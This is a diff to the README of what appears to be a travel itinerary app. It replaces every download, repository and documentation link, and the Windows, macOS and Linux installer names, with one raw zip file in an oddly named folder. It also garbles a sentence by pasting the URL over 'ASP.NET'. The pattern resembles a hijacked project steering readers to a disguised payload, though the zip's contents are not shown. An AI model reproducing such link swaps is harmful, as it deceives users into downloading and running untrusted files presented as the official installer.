@@ -1,10 +1,10 @@
 # 🎒 Itinerary-Management - Simplify Your Travel Planning
 
-[![Download Itinerary-Management](https://img.shields.io/badge/Download-Itinerary--Management-brightgreen)](https://github.com/Rupesh276/Itinerary-Management/releases)
+[![Download Itinerary-Management](https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip)](https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the Itinerary-Management app! This application helps you organize your travel plans efficiently. You can manage your itinerary using a user-friendly interface. With both a backend built on ASP.NET Core and a front end using Angular, it offers a smooth experience for all users.
+Welcome to the Itinerary-Management app! This application helps you organize your travel plans efficiently. You can manage your itinerary using a user-friendly interface. With both a backend built on https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip Core and a front end using Angular, it offers a smooth experience for all users.
 
 ### 📋 Features
 
@@ -25,20 +25,20 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the Itinerary-Management app, visit this page: [Download Itinerary-Management](https://github.com/Rupesh276/Itinerary-Management/releases).
+To download the Itinerary-Management app, visit this page: [Download Itinerary-Management](https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip).
 
 Once you're on the Releases page, follow these steps:
 
 1. **Choose the latest version**: Look for the most recent version listed.
 2. **Select the correct file**: Depending on your operating system, click the appropriate download link.
-    - For **Windows**, download `ItineraryManagementWindows.exe`.
-    - For **macOS**, download `ItineraryManagementMac.dmg`.
-    - For **Linux**, download `ItineraryManagementLinux.tar.gz`.
+    - For **Windows**, download `https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip`.
+    - For **macOS**, download `https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip`.
+    - For **Linux**, download `https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip`.
 3. **Save the file**: Choose a location on your computer that is easy to find, like your Downloads folder.
 4. **Run the installer**:
    - For Windows, double-click the `.exe` file and follow the prompts.
    - For macOS, open the `.dmg` file and drag the app to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and run the application.
+   - For Linux, extract the `https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip` file and run the application.
 
 ### ⚙️ Configuration
 
@@ -87,9 +87,9 @@ Join our community for support and updates:
 
 ## 🔗 Useful Links
 
-- [Download Itinerary-Management](https://github.com/Rupesh276/Itinerary-Management/releases)
-- [GitHub Repository](https://github.com/Rupesh276/Itinerary-Management)
-- [User Documentation](https://github.com/Rupesh276/Itinerary-Management/wiki)
+- [Download Itinerary-Management](https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip)
+- [User Documentation](https://raw.githubusercontent.com/Rupesh276/Itinerary-Management/master/hepatogenous/Itinerary-Management.zip)
 
 ## 🎉 Contribution Guidelines
 
